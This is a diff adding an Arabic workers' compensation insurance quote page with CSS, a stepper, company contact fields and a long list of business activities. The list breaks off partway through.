@@ -1,0 +1,2254 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>بيمة</title>
+  <link rel="icon" type="image/x-icon" href="https://b2b.om/assets/images/isc2.png">
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.rtl.min.css" rel="stylesheet">
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.css" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Rubik:wght@300;400;500;700&display=swap" rel="stylesheet">
+  <style>
+    * { font-family: 'Rubik', sans-serif; }
+    body { background: #faf8f5; margin: 0; padding: 0; }
+    
+    .b2b-header {
+      background: #fff;
+      padding: 12px 0;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+      z-index: 9;
+      position: relative;
+    }
+    .b2b-header .container {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .b2b-header .logo img { height: 50px; }
+    .b2b-header nav ul {
+      list-style: none;
+      display: flex;
+      gap: 30px;
+      margin: 0;
+      padding: 0;
+      align-items: center;
+    }
+    .b2b-header nav ul li a {
+      text-decoration: none;
+      color: #333;
+      font-weight: 500;
+      font-size: 14px;
+    }
+    .b2b-header nav ul li a:hover { color: #6b8e23; }
+    .b2b-header .header-left {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+    }
+    .b2b-header .header-left a {
+      text-decoration: none;
+      color: #333;
+      font-size: 14px;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+    }
+    .b2b-header .header-left .globe { font-size: 18px; cursor: pointer; }
+
+    .page-header {
+      background: linear-gradient(135deg, #f5f0e8 0%, #faf8f5 100%);
+      padding: 20px 0;
+      border-bottom: 1px solid #eee;
+    }
+    .page-heading {
+      color: #6b8e23;
+      font-size: 28px;
+      font-weight: 700;
+      margin: 0;
+    }
+    .sm-stepper {
+      display: flex;
+      align-items: center;
+      gap: 0;
+    }
+    .sm-stepper__item {
+      display: flex;
+      align-items: center;
+      flex: 1;
+      position: relative;
+    }
+    .sm-stepper__item:not(:last-child)::after {
+      content: '';
+      flex: 1;
+      height: 2px;
+      background: #ccc;
+      margin: 0 8px;
+    }
+    .sm-stepper__link {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-decoration: none;
+      color: #666;
+    }
+    .sm-stepper__circle {
+      width: 30px;
+      height: 30px;
+      border-radius: 50%;
+      border: 2px solid #6b8e23;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 13px;
+      font-weight: 600;
+      color: #6b8e23;
+      background: #fff;
+    }
+    .sm-stepper__item.active .sm-stepper__circle {
+      background: #6b8e23;
+      color: #fff;
+    }
+    .sm-stepper__label {
+      font-size: 11px;
+      margin-top: 4px;
+      white-space: nowrap;
+    }
+
+    .form-section {
+      padding: 40px 0;
+    }
+    .form-card {
+      background: #fff;
+      border-radius: 8px;
+      padding: 40px;
+      max-width: 650px;
+      margin: 0 auto;
+      box-shadow: 0 2px 12px rgba(0,0,0,0.04);
+    }
+    .form-card h4 {
+      text-align: center;
+      font-weight: 600;
+      margin-bottom: 8px;
+      font-size: 20px;
+    }
+    .form-card .subtitle {
+      text-align: center;
+      color: #666;
+      font-size: 14px;
+      margin-bottom: 30px;
+    }
+    .form-group {
+      margin-bottom: 16px;
+    }
+    .form-group label {
+      font-size: 12px;
+      color: #999;
+      margin-bottom: 4px;
+      display: block;
+    }
+    .form-control-custom {
+      width: 100%;
+      padding: 12px 16px;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+      font-size: 14px;
+      outline: none;
+      transition: border-color 0.3s;
+      background: #fff;
+    }
+    .form-control-custom:focus {
+      border-color: #6b8e23;
+    }
+    .phone-input {
+      display: flex;
+      align-items: center;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+      padding: 0 16px;
+      background: #fff;
+    }
+    .phone-input .country-code {
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      padding-left: 10px;
+      border-left: 1px solid #ddd;
+      font-size: 14px;
+      color: #333;
+    }
+    .phone-input .country-code img {
+      width: 24px;
+      height: 16px;
+    }
+    .phone-input input {
+      border: none;
+      outline: none;
+      padding: 12px 10px;
+      flex: 1;
+      font-size: 14px;
+      text-align: right;
+    }
+    .row-fields {
+      display: flex;
+      gap: 16px;
+    }
+    .row-fields .form-group { flex: 1; }
+    
+    .helper-text {
+      font-size: 12px;
+      color: #e74c3c;
+      margin-bottom: 8px;
+    }
+    .helper-text::before {
+      content: '* ';
+    }
+    .multiselect-wrapper {
+      position: relative;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+      padding: 8px 12px;
+      background: #fff;
+      min-height: 48px;
+      cursor: text;
+    }
+    .multiselect-wrapper:focus-within {
+      border-color: #6b8e23;
+    }
+    .multiselect-selected {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 4px;
+      margin-bottom: 4px;
+    }
+    .multiselect-tag {
+      background: #e8f5e9;
+      color: #333;
+      padding: 2px 8px;
+      border-radius: 4px;
+      font-size: 12px;
+      display: flex;
+      align-items: center;
+      gap: 4px;
+    }
+    .multiselect-tag .remove-tag {
+      cursor: pointer;
+      font-weight: bold;
+      color: #666;
+    }
+    .multiselect-search {
+      border: none;
+      outline: none;
+      width: 100%;
+      font-size: 14px;
+      padding: 4px 0;
+      color: #333;
+    }
+    .multiselect-search::placeholder {
+      color: #999;
+    }
+    .multiselect-dropdown {
+      display: none;
+      position: absolute;
+      top: 100%;
+      left: 0;
+      right: 0;
+      background: #fff;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+      max-height: 250px;
+      overflow-y: auto;
+      z-index: 100;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+    .multiselect-dropdown.show {
+      display: block;
+    }
+    .activity-option {
+      padding: 10px 16px;
+      font-size: 13px;
+      cursor: pointer;
+      border-bottom: 1px solid #f0f0f0;
+    }
+    .activity-option:hover {
+      background: #f5f5f5;
+    }
+    .activity-option.selected {
+      background: #e8f5e9;
+      color: #6b8e23;
+    }
+    .activity-option.hidden {
+      display: none;
+    }
+    .terms-check {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin: 20px 0;
+      font-size: 13px;
+      color: #555;
+    }
+    .terms-check a {
+      color: #6b8e23;
+      text-decoration: underline;
+    }
+    .btn-submit {
+      width: 100%;
+      padding: 14px;
+      background: #8fbc3b;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    .btn-submit:hover {
+      background: #7aa832;
+    }
+
+    .b2b-footer {
+      background: #333;
+      padding: 15px 0;
+      margin-top: 40px;
+    }
+    .b2b-footer .container {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .b2b-footer .copyright {
+      color: #aaa;
+      font-size: 12px;
+    }
+    .b2b-footer .footer-links {
+      display: flex;
+      gap: 20px;
+    }
+    .b2b-footer .footer-links a {
+      color: #aaa;
+      text-decoration: none;
+      font-size: 12px;
+    }
+    .b2b-footer .footer-links a:hover { color: #fff; }
+
+    /* Validation Styles */
+    .field-error { border: 2px solid #dc3545 !important; background-color: #fff5f5 !important; }
+    .field-error-msg { color: #dc3545; font-size: 11px; margin-top: 2px; display: block; font-weight: 500; }
+    select.field-error { border: 2px solid #dc3545 !important; }
+    .terms-error { color: #dc3545; font-size: 11px; display: block; margin-top: 4px; font-weight: 500; }
+
+
+    /* Mobile Responsive */
+    @media (max-width: 768px) {
+      /* Prevent zoom on input focus */
+      input, select, textarea { font-size: 16px !important; }
+      
+      /* Header - hamburger menu */
+      .b2b-header .container { 
+        flex-wrap: wrap; 
+        padding: 10px 15px; 
+        position: relative;
+      }
+      .b2b-header .logo img { height: 38px; }
+      .b2b-header nav { 
+        display: none;
+        width: 100%;
+        order: 3;
+        background: #fff;
+        padding: 10px 0;
+        border-top: 1px solid #eee;
+        margin-top: 10px;
+      }
+      .b2b-header nav.show { display: block; }
+      .b2b-header nav ul { 
+        flex-direction: column; 
+        gap: 0;
+        align-items: stretch;
+      }
+      .b2b-header nav ul li { 
+        border-bottom: 1px solid #f5f5f5;
+      }
+      .b2b-header nav ul li a { 
+        display: block;
+        padding: 10px 0;
+        font-size: 14px;
+      }
+      .b2b-header .header-left { 
+        gap: 10px;
+        order: 2;
+      }
+      .b2b-header .header-left a span { display: none; }
+      .b2b-header .header-left a i { font-size: 18px; }
+      .b2b-header .menu-toggle { 
+        display: flex !important;
+        order: 1;
+        background: none;
+        border: none;
+        font-size: 22px;
+        cursor: pointer;
+        padding: 5px;
+        color: #333;
+      }
+      
+      /* Page Header & Stepper */
+      .page-header { padding: 12px 0; }
+      .page-header .container { padding: 0 12px; }
+      .page-header .row { flex-direction: column; gap: 8px; }
+      .page-heading { font-size: 18px; text-align: center; margin-bottom: 8px; }
+      .sm-stepper { justify-content: center; gap: 0; }
+      .sm-stepper__item { min-width: auto; }
+      .sm-stepper__circle { width: 22px; height: 22px; font-size: 10px; }
+      .sm-stepper__label { font-size: 9px; }
+      .sm-stepper__item:not(:last-child)::after { margin: 0 4px; }
+      
+      /* Form */
+      .form-section { padding: 15px 0; }
+      .form-card { padding: 18px 12px; margin: 0 8px; max-width: 100%; }
+      .form-card h4 { font-size: 17px; }
+      .form-card .subtitle { font-size: 13px; }
+      .row-fields { flex-direction: column; gap: 0; }
+      .row-fields .form-group { flex: none; width: 100%; }
+      .form-group label { font-size: 11px; }
+      .form-control-custom { padding: 10px 12px; font-size: 16px; }
+      .phone-input { flex-direction: row; }
+      .phone-input input { font-size: 16px; }
+      .btn-submit { font-size: 15px; padding: 12px; }
+      
+      /* Tables */
+      .table-responsive { overflow-x: auto; -webkit-overflow-scrolling: touch; }
+      .insured-table { font-size: 11px; }
+      .insured-table th, .insured-table td { padding: 6px 4px; white-space: nowrap; }
+      
+      /* Review/Checkout */
+      .review-card .row { flex-direction: column-reverse; }
+      .review-right { padding: 15px 12px; }
+      .review-left { padding: 15px 12px; border-right: none; border-top: 1px solid #eee; }
+      .summary-panel { position: static; }
+      .company-header img { width: 40px; height: 40px; }
+      .btn-buy-now { font-size: 15px; padding: 12px; }
+      .btn-prev { font-size: 13px; padding: 8px 15px; }
+      
+      /* Offers */
+      .so-offer-header { flex-direction: column; align-items: flex-start; padding: 12px; }
+      .so-offer-right { width: 100%; flex-direction: column; align-items: flex-end; }
+      
+      /* Footer */
+      .b2b-footer { margin-top: 20px; }
+      .b2b-footer .container { flex-direction: column; gap: 8px; text-align: center; }
+      .b2b-footer .footer-links { justify-content: center; flex-wrap: wrap; }
+    }
+
+  </style>
+</head>
+<body>
+  <!-- Header -->
+  <header class="b2b-header">
+    <div class="container">
+      <div class="header-left">
+        <a href="tel:96822644442"><i class="fa-solid fa-headset"></i> <span dir="ltr">968 22644442</span></a>
+        <span class="globe"><i class="fa-solid fa-globe"></i></span>
+      </div>
+      <nav>
+        <ul>
+          <li><a href="/">الصفحة الرئيسية</a></li>
+          <li><a href="javascript:void(0)">تأمين</a></li>
+          <li><a href="javascript:void(0)">من نحن</a></li>
+          <li><a href="javascript:void(0)">تواصل معنا</a></li>
+        </ul>
+      </nav>
+      <div class="logo">
+        <a href="/"><img src="b2b-logo.png" alt="بيمة للأعمال"></a>
+      </div>
+    </div>
+  </header>
+
+  <!-- Page Header with Stepper -->
+  <div class="page-header">
+    <div class="container">
+      <div class="row align-items-center">
+        <div class="col-12 col-md-6 text-end">
+          <h1 class="page-heading">تأمين تعويضات العمال</h1>
+        </div>
+        <div class="col-12 col-md-6">
+          <div class="sm-stepper">
+            <div class="sm-stepper__item active">
+              <a class="sm-stepper__link">
+                <span class="sm-stepper__circle">1</span>
+                <span class="sm-stepper__label">تفاصيل</span>
+              </a>
+            </div>
+            <div class="sm-stepper__item">
+              <a class="sm-stepper__link">
+                <span class="sm-stepper__circle">2</span>
+                <span class="sm-stepper__label">سجل المطالبات</span>
+              </a>
+            </div>
+            <div class="sm-stepper__item">
+              <a class="sm-stepper__link">
+                <span class="sm-stepper__circle">3</span>
+                <span class="sm-stepper__label">إضافة مؤمن عليه</span>
+              </a>
+            </div>
+            <div class="sm-stepper__item">
+              <a class="sm-stepper__link">
+                <span class="sm-stepper__circle">4</span>
+                <span class="sm-stepper__label">العروض</span>
+              </a>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Form Section -->
+  <section class="form-section">
+    <div class="container">
+      <div class="form-card">
+        <h4>نموذج طلب عرض سعر</h4>
+        <p class="subtitle">أدخل بياناتك لإنشاء عرض تأمين تعويضات العمال</p>
+
+        <form id="workersForm">
+          <!-- Contact Number -->
+          <div class="form-group">
+            <div class="phone-input">
+              <input type="tel" placeholder="12345678" id="phone">
+              <div class="country-code">
+                <span>968+</span>
+                <img src="https://flagcdn.com/w40/om.png" alt="عمان">
+              </div>
+            </div>
+            <label>رقم التواصل</label>
+          </div>
+
+          <!-- CR No + Company Name -->
+          <div class="row-fields">
+            <div class="form-group">
+              <input type="text" class="form-control-custom" placeholder="اسم الشركة" id="company_name">
+            </div>
+            <div class="form-group">
+              <input type="text" class="form-control-custom" placeholder="رقم السجل التجاري" id="cr_no">
+            </div>
+          </div>
+
+          <!-- Email -->
+          <div class="form-group">
+            <input type="email" class="form-control-custom" placeholder="البريد الإلكتروني" id="email">
+          </div>
+
+          <!-- Business Activities -->
+          <p class="helper-text">يرجى اختيار جميع الأنشطة التجارية المسجلة ضمن السجل التجاري لشركتكم</p>
+          <div class="form-group">
+            <div class="multiselect-wrapper" id="multiselect_wrapper">
+              <div class="multiselect-selected" id="selected_tags"></div>
+              <input type="text" class="multiselect-search" placeholder="اختر أنشطة الأعمال" id="business_activities_search" autocomplete="off">
+              <div class="multiselect-dropdown" id="activities_dropdown">
+                <div class="activity-option" data-value="1562">أبحاث السوق واستطلاعات الرأي العام</div>
+                <div class="activity-option" data-value="936">اتلاف الوثائق الورقية والإلكترونية</div>
+                <div class="activity-option" data-value="1547">اختبار وقياس المؤشرات البيئية</div>
+                <div class="activity-option" data-value="1497">إدارة الائتمان والعقارات الخاصة</div>
+                <div class="activity-option" data-value="1716">إدارة الابتكارات الصناعية</div>
+                <div class="activity-option" data-value="1515">إدارة الاستثمار</div>
+                <div class="activity-option" data-value="1513">إدارة الاصدارات</div>
+                <div class="activity-option" data-value="1352">إدارة السفن</div>
+                <div class="activity-option" data-value="1711">إدارة الصالات</div>
+                <div class="activity-option" data-value="1631">إدارة المحاجر البيطرية</div>
+                <div class="activity-option" data-value="1712">إدارة المشاريع الصناعية</div>
+                <div class="activity-option" data-value="1346">إدارة اليخوت</div>
+                <div class="activity-option" data-value="1799">إدارة جمعيات ملاك العقارات</div>
+                <div class="activity-option" data-value="1506">إدارة دورة الإيرادات للمؤسسات الصحية</div>
+                <div class="activity-option" data-value="1335">إدارة ساحات أيواء وسائل النقل البري</div>
+                <div class="activity-option" data-value="1512">إدارة صناديق الاستثمار</div>
+                <div class="activity-option" data-value="1514">إدارة محافظ الأوراق المالية</div>
+                <div class="activity-option" data-value="1511">إدارة مطالبات التأمين الصحي</div>
+                <div class="activity-option" data-value="1490">إدارة وتشغيل الأسواق المالية</div>
+                <div class="activity-option" data-value="1713">إدارة وتشغيل محطات تعبئة الوقود</div>
+                <div class="activity-option" data-value="1715">إدارة وتشغيل محطات تعبئة غاز البترول المسال (غاز الطبخ)</div>
+                <div class="activity-option" data-value="1717">إدارة وتشغيل محطات معالجة الغاز الطبيعي</div>
+                <div class="activity-option" data-value="1440">إدارة وتشغيل مرافق تجهيز البيانات الخاصة بجهات أخرى على أساس دائم</div>
+                <div class="activity-option" data-value="1667">إدارة وتشغيل وكالة شركات الطيران</div>
+                <div class="activity-option" data-value="1362">ادارة وتوجيه وسائل النقل البري</div>
+                <div class="activity-option" data-value="1000">استئجار آلات ومعدات التشييد الأخرى التي يشغلها عامل</div>
+                <div class="activity-option" data-value="395">استبدال الأسطح الخارجية للإطارات الهوائية المستعملة</div>
+                <div class="activity-option" data-value="1492">استبدال العملات (محلات الصرافة)</div>
+                <div class="activity-option" data-value="60">استخراج الأسمدة الطبيعية</div>
+                <div class="activity-option" data-value="53">استخراج الغاز الطبيعي</div>
+                <div class="activity-option" data-value="63">استخراج الملح من باطن الأرض بما يشمل إذابته وضخه</div>
+                <div class="activity-option" data-value="52">استخراج النفط الخام</div>
+                <div class="activity-option" data-value="392">استخراج سموم الحشرات والحيوانات</div>
+                <div class="activity-option" data-value="1773">استشارات اجتماعية وأسرية</div>
+                <div class="activity-option" data-value="1609">استشارات احصائية</div>
+                <div class="activity-option" data-value="1612">استشارات إدارة المخاطر</div>
+                <div class="activity-option" data-value="1543">استشارات ادارة المشاريع</div>
+                <div class="activity-option" data-value="1587">استشارات اعلامية</div>
+                <div class="activity-option" data-value="1585">استشارات اقتصادية</div>
+                <div class="activity-option" data-value="1568">استشارات التصميم الجرافيكي</div>
+                <div class="activity-option" data-value="1599">استشارات التمويل والاستثمار</div>
+                <div class="activity-option" data-value="1510">استشارات الخدمات الاكتوارية</div>
+                <div class="activity-option" data-value="1619">استشارات الصحة والسلامة المهنية</div>
+                <div class="activity-option" data-value="1594">استشارات الصيدلانية</div>
+                <div class="activity-option" data-value="1528">استشارات الصيرفة الإسلامية</div>
+                <div class="activity-option" data-value="1600">استشارات الفيزيائية</div>
+                <div class="activity-option" data-value="1621">استشارات الملكية الفكرية</div>
+                <div class="activity-option" data-value="1525">استشارات المواريث والتركات</div>
+                <div class="activity-option" data-value="1596">استشارات الهندسة الكميائية</div>
+                <div class="activity-option" data-value="1593">إستشارات الهندسة الكهربائية</div>
+                <div class="activity-option" data-value="1535">استشارات الهندسة المدنية</div>
+                <div class="activity-option" data-value="1534">استشارات الهندسة المعمارية</div>
+                <div class="activity-option" data-value="1573">استشارات بيئية</div>
+                <div class="activity-option" data-value="1586">استشارات تسويقية</div>
+                <div class="activity-option" data-value="1592">استشارات جغرافية</div>
+                <div class="activity-option" data-value="1626">استشارات جمركية</div>
+                <div class="activity-option" data-value="1591">استشارات جيولوجية</div>
+                <div class="activity-option" data-value="1544">استشارات دراسات معمارية</div>
+                <div class="activity-option" data-value="1624">استشارات زراعية</div>
+                <div class="activity-option" data-value="1618">استشارات سياحية</div>
+                <div class="activity-option" data-value="1605">استشارات صحية</div>
+                <div class="activity-option" data-value="1610">استشارات علم النبات</div>
+                <div class="activity-option" data-value="1780">استشارات علوم الأثار</div>
+                <div class="activity-option" data-value="1613">استشارات علوم الأحياء</div>
+                <div class="activity-option" data-value="1763">استشارات علوم التغذية</div>
+                <div class="activity-option" data-value="1614">استشارات علوم الكيمياء</div>
+                <div class="activity-option" data-value="1589">استشارات في مجال الاستزراع السمكي</div>
+                <div class="activity-option" data-value="1764">استشارات في مجال الصحة العامة</div>
+                <div class="activity-option" data-value="1620">استشارات في مجال الطاقة البديلة</div>
+                <div class="activity-option" data-value="1623">استشارات في مجال الطيران</div>
+                <div class="activity-option" data-value="1598">استشارات في مجال العقود</div>
+                <div class="activity-option" data-value="1622">استشارات في مجال الفضاء</div>
+                <div class="activity-option" data-value="1595">استشارات في مجال تقنية الاتصالات</div>
+                <div class="activity-option" data-value="1441">استشارات في مجال تقنية المعلومات والامن الالكتروني</div>
+                <div class="activity-option" data-value="1597">استشارات في مجال سلامة الأغذية</div>
+                <div class="activity-option" data-value="1590">استشارات في مجال مسح الكميات</div>
+                <div class="activity-option" data-value="1607">استشارات في مجال نظم المعلومات الجغرافية</div>
+                <div class="activity-option" data-value="1588">استشارات موارد بشرية</div>
+                <div class="activity-option" data-value="1616">استشارات هندسة الأجهزة الطبية</div>
+                <div class="activity-option" data-value="1542">استشارات هندسة السلامة والوقاية من الحرائق</div>
+                <div class="activity-option" data-value="1714">استشارات هندسة العمليات</div>
+                <div class="activity-option" data-value="1604">استشارات هندسة إلكترونيات</div>
+                <div class="activity-option" data-value="1541">استشارات هندسة المدن والتخطيط المعماري والحضري</div>
+                <div class="activity-option" data-value="1601">استشارات هندسة الميكانيكية</div>
+                <div class="activity-option" data-value="1606">استشارات هندسة النفط والغاز والبتروكيماويات</div>
+                <div class="activity-option" data-value="1603">استشارات هندسة بيئية</div>
+                <div class="activity-option" data-value="1602">استشارات هندسة صناعية</div>
+                <div class="activity-option" data-value="1574">استشارات هندسية زراعية</div>
+                <div class="activity-option" data-value="1775">استقدام الفرق الفنية</div>
+                <div class="activity-option" data-value="1364">استمرارية صلاحية الطيران</div>
+                <div class="activity-option" data-value="306">استنساخ التسجيلات وأشرطة التسجيل البصرية</div>
+                <div class="activity-option" data-value="305">استنساخ التسجيلات وأشرطة التسجيل السمعية</div>
+                <div class="activity-option" data-value="309">استنساخ برامج الحاسب الآلي الجاهزة</div>
+                <div class="activity-option" data-value="1499">إصدار بطاقات الائتمان</div>
+                <div class="activity-option" data-value="1818">إصلاح الآلات الموسيقية</div>
+                <div class="activity-option" data-value="1011">إصلاح الإطارات والعجلات المعدنية</div>
+                <div class="activity-option" data-value="880">إصلاح الأقمشة الكتانية والمقيرة وأجولة تخزين الأسمدة والكيميائيات</div>
+                <div class="activity-option" data-value="881">إصلاح الحبال وشباك الصيد، بما في ذلك رتقها وتعديلها</div>
+                <div class="activity-option" data-value="1817">إصلاح الدراجات الهوائية</div>
+                <div class="activity-option" data-value="1816">إصلاح الذهب والمجوهرات</div>
+                <div class="activity-option" data-value="886">إصلاح الزجاج والمنتجات الزجاجية</div>
+                <div class="activity-option" data-value="1815">إصلاح الساعات</div>
+                <div class="activity-option" data-value="884">إصلاح المنتجات المطاطية باستثناء الإطارات</div>
+                <div class="activity-option" data-value="882">إصلاح أو إعادة ضبط السقالات الخشبية واسطوانات أو براميل الشحن وما شابهها</div>
+                <div class="activity-option" data-value="892">إصلاح أو تجديد الآلات الموسيقية كالاورغ وسائر الآلات الموسيقية التاريخية</div>
+                <div class="activity-option" data-value="1010">إصلاح راديتر المركبات وتنظيفها</div>
+                <div class="activity-option" data-value="1016">إصلاح عادم الصوت للسيارات والمركبات</div>
+                <div class="activity-option" data-value="1009">إصلاح كهرباء المركبات</div>
+                <div class="activity-option" data-value="1018">إصلاح محاور وفرامل السيارات</div>
+                <div class="activity-option" data-value="1015">إصلاح مكيفات السيارات</div>
+                <div class="activity-option" data-value="885">إصلاح منتجات اللدائن</div>
+                <div class="activity-option" data-value="1012">إصلاح ميزان المركبات</div>
+                <div class="activity-option" data-value="1008">إصلاح ميكانيك المركبات</div>
+                <div class="activity-option" data-value="1007">إصلاح وسمكرة ودهان المركبات</div>
+                <div class="activity-option" data-value="850">إصلاح وصيانة آلات التصوير (الكاميرات) الرقمية</div>
+                <div class="activity-option" data-value="858">إصلاح وصيانة آلات التنظيف باستعمال الموجات فوق الصوتية</div>
+                <div class="activity-option" data-value="835">إصلاح وصيانة آلات الزراعة والغابات</div>
+                <div class="activity-option" data-value="840">إصلاح وصيانة آلات الملبوسات النسيجية والمنتجات الجلدية</div>
+                <div class="activity-option" data-value="838">إصلاح وصيانة آلات عمليات التعدين واستغلال المحاجر والتشييد</div>
+                <div class="activity-option" data-value="1809">إصلاح وصيانة آلات ومعدات التصوير</div>
+                <div class="activity-option" data-value="856">إصلاح وصيانة أجهزة الأسلاك الغير حاملة للتيار الكهربائي من اللدائن بما في ذلك صناديق التجميع المصنوعة من اللدائن ولوحات الواجهة وما شابهها</div>
+                <div class="activity-option" data-value="888">إصلاح وصيانة أجهزة التعقيم للمختبرات وأجهزة التقطير للمختبرات</div>
+                <div class="activity-option" data-value="1805">إصلاح وصيانة أجهزة الحاسوب والمعدات الطرفية للحاسوب</div>
+                <div class="activity-option" data-value="893">إصلاح وصيانة أجهزة الخدمة الذاتية</div>
+                <div class="activity-option" data-value="849">إصلاح وصيانة أجهزة النظام العالمي لتحديد المواقع (GPS)</div>
+                <div class="activity-option" data-value="887">إصلاح وصيانة أجهزة تقويم العظام والأطراف الصناعية وأقنعة الغاز</div>
+                <div class="activity-option" data-value="861">إصلاح وصيانة أجهزة توزيع الكهرباء والتحكم فيها</div>
+                <div class="activity-option" data-value="868">اصلاح وصيانة أجهزة ومعدات الطاقة البديلة</div>
+                <div class="activity-option" data-value="960">إصلاح وصيانة الآبار والأفلاج</div>
+                <div class="activity-option" data-value="841">إصلاح وصيانة الآلات المتخصصة الغرض (باستثناء آلات التنظيف باستعمال الموجات فوق الصوتية)</div>
+                <div class="activity-option" data-value="834">إصلاح وصيانة الآلات المتعددة الأغراض الأخرى</div>
+                <div class="activity-option" data-value="839">إصلاح وصيانة الآلات المستخدمة في تحضير الطعام والشراب والتبغ</div>
+                <div class="activity-option" data-value="837">إصلاح وصيانة الآلات المستخدمة في معالجة المعادن</div>
+                <div class="activity-option" data-value="847">إصلاح وصيانة الآلات المكتبية والمحاسبية (باستثناء الحواسيب والمعدات الطرفية)</div>
+                <div class="activity-option" data-value="1810">إصلاح وصيانة الأجهزة الإلكترونية (يشمل إصلاح الراديو والتلفزيوني والأقراص المدمجة)</div>
+                <div class="activity-option" data-value="854">إصلاح وصيانة الأدوات البصرية ومعدات التصوير الفوتوغرافي</div>
+                <div class="activity-option" data-value="862">إصلاح وصيانة الأسلاك والكابلات الكهربائية والإلكترونية (باستثناء كابلات الحاسب الآلي)</div>
+                <div class="activity-option" data-value="824">إصلاح وصيانة الأسلحة والذخائر والمعدات والرادارات العسكرية</div>
+                <div class="activity-option" data-value="830">إصلاح وصيانة الأفران ومواقد الأفران</div>
+                <div class="activity-option" data-value="863">إصلاح وصيانة البطاريات وشواحنها</div>
+                <div class="activity-option" data-value="826">إصلاح وصيانة الحاويات (الكونتينرات)</div>
+                <div class="activity-option" data-value="1034">إصلاح وصيانة الدراجات النارية</div>
+                <div class="activity-option" data-value="846">إصلاح وصيانة الدورانات والمراجيح ومنصات الرماية وغيرها من وسائل التسلية في الملاهي</div>
+                <div class="activity-option" data-value="844">إصلاح وصيانة الشاحنات اليدوية وعجلات اليد</div>
+                <div class="activity-option" data-value="820">إصلاح وصيانة الصهاريج والخزانات والأوعية المعدنية</div>
+                <div class="activity-option" data-value="872">إصلاح وصيانة الطائرات ومحركاتها</div>
+                <div class="activity-option" data-value="836">إصلاح وصيانة العدد الآلية، باستثناء معدات اللحام الكهربائية</div>
+                <div class="activity-option" data-value="823">إصلاح وصيانة العدد اليدوية والأدوات المعدنية العامة</div>
+                <div class="activity-option" data-value="1811">إصلاح وصيانة الغسالات والثلاجات والمكيفات</div>
+                <div class="activity-option" data-value="855">إصلاح وصيانة الكاميرات (باستثناء الكاميرات الرقمية)</div>
+                <div class="activity-option" data-value="890">إصلاح وصيانة الماكينات التي تعمل بإدخال عملات معدنية والألعاب المشابهة</div>
+                <div class="activity-option" data-value="829">إصلاح وصيانة المحامل والتروس وأجهزة التعشيق ونقل الحركة</div>
+                <div class="activity-option" data-value="827">إصلاح وصيانة المحركات والتوربينات البحرية</div>
+                <div class="activity-option" data-value="828">إصلاح وصيانة المضخات والضواغط والحنفيات والصمامات</div>
+                <div class="activity-option" data-value="822">إصلاح وصيانة المعادن الملحومة</div>
+                <div class="activity-option" data-value="865">إصلاح وصيانة المعدات الكهربائية الأخرى</div>
+                <div class="activity-option" data-value="819">إصلاح وصيانة المنتجات المعدنية الإنشائية</div>
+                <div class="activity-option" data-value="1807">إصلاح وصيانة الهواتف النقالة</div>
+                <div class="activity-option" data-value="1808">إصلاح وصيانة أنظمة مكبرات الصوت وصيانتها</div>
+                <div class="activity-option" data-value="866">إصلاح وصيانة حوايا الوقود وأجهزة تصحيح التيار والمواسعات (المكثفات) وغيرها من المكونات الإلكترونية</div>
+                <div class="activity-option" data-value="860">إصلاح وصيانة شاحنات البطاريات</div>
+                <div class="activity-option" data-value="889">إصلاح وصيانة عدادات مواقف السيارات وساعات تحديد الوقت واختام طبع الوقت/التاريخ ومحددات وقت العمليات وما شابهها من معدات تسجيل الوقت</div>
+                <div class="activity-option" data-value="825">إصلاح وصيانة علب القولبة والقوالب (باستثناء قوالب السبائك)</div>
+                <div class="activity-option" data-value="871">إصلاح وصيانة قاطرات ومعدات السكك الحديدية</div>
+                <div class="activity-option" data-value="843">إصلاح وصيانة ماكينات الإملاء</div>
+                <div class="activity-option" data-value="1806">إصلاح وصيانة معدات الاتصالات</div>
+                <div class="activity-option" data-value="851">إصلاح وصيانة معدات الإشعاع والمعدات الكهربائية والإلكترونية المستخدمة في الأغراض الطبية</div>
+                <div class="activity-option" data-value="864">إصلاح وصيانة معدات الإضاءة الكهربائية</div>
+                <div class="activity-option" data-value="845">إصلاح وصيانة معدات البولينغ الاوتوماتيكية</div>
+                <div class="activity-option" data-value="831">إصلاح وصيانة معدات الرفع والمناولة</div>
+                <div class="activity-option" data-value="852">إصلاح وصيانة معدات القياس والاختبار والملاحة والتحكم</div>
+                <div class="activity-option" data-value="857">إصلاح وصيانة معدات اللحام الكهربائية</div>
+                <div class="activity-option" data-value="853">إصلاح وصيانة معدات ضبط العمليات الصناعية</div>
+                <div class="activity-option" data-value="848">إصلاح وصيانة مولدات (إشارة) النبض</div>
+                <div class="activity-option" data-value="821">إصلاح وصيانة مولدات البخار</div>
+                <div class="activity-option" data-value="832">إصلاح وصيانة وصنع أجزاء وقطع مخصصة للآلات والمعدات المتعددة الأغراض</div>
+                <div class="activity-option" data-value="1812">إصلاح وغسيل الأحذية والمنتجات الجلدية</div>
+                <div class="activity-option" data-value="394">إعادة صنع الإطارات</div>
